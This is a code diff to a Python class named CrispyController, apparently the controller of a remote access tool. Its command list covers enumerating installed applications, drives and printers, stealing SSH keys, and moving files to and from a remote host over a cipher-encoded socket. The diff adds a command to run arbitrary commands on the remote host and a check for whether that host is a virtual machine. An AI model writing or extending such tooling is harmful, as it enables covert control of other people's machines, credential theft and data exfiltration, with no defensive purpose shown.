@@ -18,6 +18,8 @@ class CrispyController:
             enum_applications  - get a list of installed applications
             enum_drives        - get a list of drives
             enum_printers      - get a list of printers
+            execute            - run a command on remote host
+            is_virtual         - determine if remote host is running on a virtual machine
             get_ssh_keys       - get any ssh keys
             download           - download [src absolute path] [dest absolute path]
             upload             - upload [src absolute path] [dest absolute path]
@@ -99,7 +101,7 @@ class CrispyController:
                             print "[!] File already exists locally.\n"
                         else:
                             print "[-] Attempting download of " + args[1] + "..."
-                            self.sock.sendall(self.cipher.encode(cmd + "\n")) #should be able to just send "save to dir" not whole cmd
+                            self.sock.sendall(self.cipher.encode(cmd + "\n"))
                              
                             if self.receiveFile(args[2]):      
                                 print "[+] File transfer complete!\n"
@@ -113,7 +115,7 @@ class CrispyController:
                     if len(args) == 3:
                         if os.path.isfile(args[1]):
                             print "[-] Attempting upload of " + args[1] + "..."
-                            self.sock.sendall(self.cipher.encode(cmd + "\n")) #should be able to just send "save to dir" not whole cmd
+                            self.sock.sendall(self.cipher.encode(cmd + "\n"))
         
                             if self.uploadFile(args[1]):
                                 print "[+] File transfer complete!\n"
